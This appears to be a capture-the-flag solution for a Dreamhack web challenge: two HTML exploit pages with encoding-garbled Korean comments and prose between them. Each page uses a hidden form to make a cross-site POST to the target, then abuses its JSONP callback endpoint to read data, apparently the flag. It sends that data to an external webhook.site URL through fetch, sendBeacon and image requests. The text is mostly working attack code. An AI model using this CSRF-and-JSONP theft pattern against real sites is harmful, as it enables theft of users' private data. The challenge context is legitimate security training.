<!DOCTYPE html>
<html>
<body>
<h1>Loading...</h1>

<!-- iframeìœ¼ë¡œ /post ë¡œë“œ -->
<iframe id="frame" src="http://host8.dreamhack.games:9182/post" style="display:none" name="target"></iframe>

<!-- Formìœ¼ë¡œ POST ìš”ì²­ (CORS ìš°íšŒ) -->
<form id="myform" action="http://host8.dreamhack.games:9182/post" method="POST" target="target" style="display:none">
  <input name="info_value" id="flag_input">
</form>

<script>
const WEBHOOK = 'https://webhook.site/c9d4a3d0-88aa-45d5-8c8a-6c317e3f2bd1';

let flagValue = '';

// Step 1: iframe ë¡œë“œ ì™„ë£Œ ëŒ€ê¸°
document.getElementById('frame').onload = function() {
  console.log('[1] /post ë¡œë“œ ì™„ë£Œ');
  
  // iframeì˜ URLì„ í™•ì¸í•´ì„œ POST í›„ ë¦¬ë‹¤ì´ë ‰íŠ¸ì¸ì§€ ì²´í¬
  try {
    const iframeUrl = this.contentWindow.location.href;
    console.log('iframe URL:', iframeUrl);
    
    if (iframeUrl.includes('/info')) {
      // POST ì™„ë£Œ í›„ /infoë¡œ ë¦¬ë‹¤ì´ë ‰íŠ¸ë¨
      console.log('[3] POST ì™„ë£Œ! callback í˜¸ì¶œ ì¤‘...');
      callCallback();
      return;
    }
  } catch(e) {
    // Cross-originì´ë©´ ì—ëŸ¬ (ì •ìƒ)
    console.log('Cross-origin (expected)');
  }
  
  // ì²« ë¡œë“œì¸ ê²½ìš°: form ì œì¶œ ì¤€ë¹„
  setTimeout(submitForm, 1000);
};

function submitForm() {
  console.log('[2] Form ì œì¶œ ì¤‘...');
  
  // ì„ì˜ì˜ ê°’ìœ¼ë¡œ ì‹œë„ (FLAGë¥¼ ëª¨ë¥´ë¯€ë¡œ)
  // í•˜ì§€ë§Œ ì—¬ëŸ¬ ê°’ì„ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤
  document.getElementById('flag_input').value = 'DH{test_flag}';
  document.getElementById('myform').submit();
  
  // ì œì¶œ í›„ ëŒ€ê¸° (onloadê°€ ë‹¤ì‹œ íŠ¸ë¦¬ê±°ë¨)
}

function callCallback() {
  window.exfil = function(data) {
    console.log('[4] ë°ì´í„° ìˆ˜ì‹ :', data);
    
    const flag = data.info || 'EMPTY';
    
    // ì—¬ëŸ¬ ë°©ë²•ìœ¼ë¡œ ì „ì†¡
    fetch(WEBHOOK + '?flag=' + encodeURIComponent(flag)).catch(e => {});
    
    if (navigator.sendBeacon) {
      navigator.sendBeacon(WEBHOOK + '?beacon=' + encodeURIComponent(flag));
    }
    
    new Image().src = WEBHOOK + '?img=' + encodeURIComponent(flag);
  };
  
  const script = document.createElement('script');
  script.src = 'http://host8.dreamhack.games:9182/callback?callback=window.exfil';
  document.body.appendChild(script);
}

// ì—ëŸ¬ í•¸ë“¤ë§
window.onerror = function(msg) {
  new Image().src = WEBHOOK + '?error=' + encodeURIComponent(msg);
};
</script>
</body>
</html>
í•˜ì§€ë§Œ ì´ê²ƒë„ ë¬¸ì œê°€ ìˆìŠµë‹ˆë‹¤ - FLAGë¥¼ ëª¨ë¥´ë¯€ë¡œ ì„ì˜ ê°’ë§Œ POSTë©ë‹ˆë‹¤.
ğŸ”¥ ì§„ì§œ í•´ê²°ì±…: 2-Step Attack
ë” ë‚˜ì€ ë°©ë²•ì€ ë´‡ì´ host8.dreamhack.games ë‚´ë¶€ í˜ì´ì§€ë¥¼ ë°©ë¬¸í•˜ê²Œ í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤! ìƒˆë¡œìš´ ì•„ì´ë””ì–´: /callback í˜ì´ì§€ë¥¼ ì•…ìš©!
<!DOCTYPE html>
<html>
<body>
<script>
const WEBHOOK = 'https://webhook.site/c9d4a3d0-88aa-45d5-8c8a-6c317e3f2bd1';

// Step 1: Formìœ¼ë¡œ ë”ë¯¸ ë°ì´í„° POST
const form = document.createElement('form');
form.method = 'POST';
form.action = 'http://host8.dreamhack.games:9182/post';
form.target = 'hiddenFrame';

const input = document.createElement('input');
input.name = 'info_value';
input.value = 'LEAK_TEST';
form.appendChild(input);

const iframe = document.createElement('iframe');
iframe.name = 'hiddenFrame';
iframe.style.display = 'none';
document.body.appendChild(iframe);
document.body.appendChild(form);

console.log('[1] Submitting form...');
form.submit();

// Step 2: Form ì œì¶œ í›„ callback í˜¸ì¶œ
setTimeout(() => {
  console.log('[2] Calling callback...');
  
  window.exfil = function(data) {
    console.log('[3] Data received:', data);
    const info = JSON.stringify(data);
    
    // ì „ì†¡
    if (navigator.sendBeacon) {
      navigator.sendBeacon(WEBHOOK + '?data=' + encodeURIComponent(info));
    }
    new Image().src = WEBHOOK + '?img=' + encodeURIComponent(info);
    
    try {
      fetch(WEBHOOK, {
        method: 'POST',
        body: 'data=' + encodeURIComponent(info)
      });
    } catch(e) {}
  };
  
  const script = document.createElement('script');
  script.src = 'http://host8.dreamhack.games:9182/callback?callback=window.exfil';
  script.onerror = () => {
    new Image().src = WEBHOOK + '?error=script_load_failed';
  };
  document.body.appendChild(script);
}, 2000);
</script>
</body>
</html>
